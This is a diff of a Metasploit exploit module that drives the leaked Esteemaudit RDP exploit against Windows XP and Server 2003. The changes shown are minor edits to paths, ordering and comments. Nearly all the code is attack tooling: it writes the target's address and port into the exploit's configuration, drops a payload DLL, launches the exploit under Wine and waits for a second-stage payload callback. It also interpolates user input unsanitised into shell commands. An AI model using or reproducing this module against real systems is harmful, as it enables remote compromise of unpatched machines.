@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	  ['XPSP1         Windows XP SP1',{}],
 	  ['XPSP0|1       Windows XP SP0 or SP1',{}],
 	  ['XPSP2         Windows XP SP2',{}],
-    ['XPSP3         Windows XP SP3',{}],
+          ['XPSP3         Windows XP SP3',{}],
 	  ['XPSP2|3       Windows XP SP2 or SP3',{}],
 	  ['W2K3SP0       Windows 2003 SP0',{}],
 	  ['W2K3SP1       Windows 2003 SP1',{}],
@@ -47,7 +47,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
 	register_options([
 		OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x86',['x86','x64']]),
-		OptString.new('ESTEEMAUDITPATH',[true,'Path directory of Esteemaudit.exe','/usr/share/esteemaudit/']),
+		OptString.new('ESTEEMAUDITPATH',[true,'Path directory of Esteemaudit.exe','/usr/share/esteemaudit']),
 		OptString.new('RPORT',[true,'The RDP service port','3389']),
 		OptString.new('WINEPATH',[true,'WINE drive_c path','/root/.wine/drive_c/'])
 	], self.class)
@@ -67,10 +67,11 @@ class MetasploitModule < Msf::Exploit::Remote
   sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
-  sed = `sed -i 's|%WINEPATH%|#{datastore['WINEPATH']}|' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   sed = `sed -i 's|%ESTEEMAUDITPATH%|#{datastore['ESTEEMAUDITPATH']}|' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
+  sed = `sed -i 's|%WINEPATH%|#{datastore['WINEPATH']}|' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   
+  #WIN72K8R2 (6-8) and XP (0-5)
   if target.name =~ /Windows XP SP0/
 	objective = "XPSP0"
   elsif target.name =~ /Windows XP SP1/
@@ -108,7 +109,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	f.print dll
   end
 
-  #Send Exploit
+  #Send Exploit + Payload Injection
   print_status('Launching Esteemaudit...')
   output = `cd #{datastore['ESTEEMAUDITPATH']}; wine Esteemaudit-2.1.0.exe 2>null &`
   if output =~ /Waiting for callback from second stage payload/
